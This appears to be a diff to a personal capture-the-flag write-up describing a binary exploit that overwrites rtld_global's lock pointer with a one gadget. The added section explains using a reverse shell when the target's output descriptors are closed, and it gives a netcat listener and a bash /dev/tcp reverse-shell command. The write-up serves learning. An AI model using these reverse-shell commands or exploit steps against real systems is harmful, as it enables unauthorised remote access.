@@ -1,3 +1,5 @@
+# reverse shell web
+- https://www.revshells.com/
 # Solve
 - In this task, i learnt 2 main techniques, which is rtld global's func ptr overwrite and reverse shell
 ## Overwrite lock recursive pointer
@@ -29,3 +31,19 @@
 - At this stage, the program will call lock, which i replaced with one gadget
 - Ill check stack requirement at this stage to choose suitable one gadget then get shell
 ## Recursive shell
+- This is the final stage after getting shell. I need use this techinque because the program's fd 1 and fd 2 are closed
+- This mean even if i get shell, i cant get anything from the target as it will output nothing
+- To fix this, ill use recursive shell
+- The main idea of this technique is to execute new shell in my local host, which has fd 1,2,0 as sockets and all of it are bidirectional pipes. In other words ill use the target's shell to connect to my own server with new shell on
+- The new shell will just like the shell in a server, all it pipes are bidirectional, it uses sockets to output / input
+- The only different is i controled the server by default because it is my server
+- And most importantly, it has all pipes open
+### Create mini host
+- nc -lvnp 1337
+### Connect to mini host by target's shell
+- bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'
+### Bonus
+- There are various reverse shell that is written in different language and for different OS
+- Note that i have to know the target's OS type to know what reverse shell to use. Because each OS may has different shell type and some reverse shell comand may not work with that shell
+- For example, if i use bash command to reverse shell, most times it works if the target is using linux. But if they use window, it will result in error and do nothing
+- There is a web that contains various reverse shell command for numerous languages and OS that i can use as blueprints for my own reverse shell command: https://www.revshells.com/
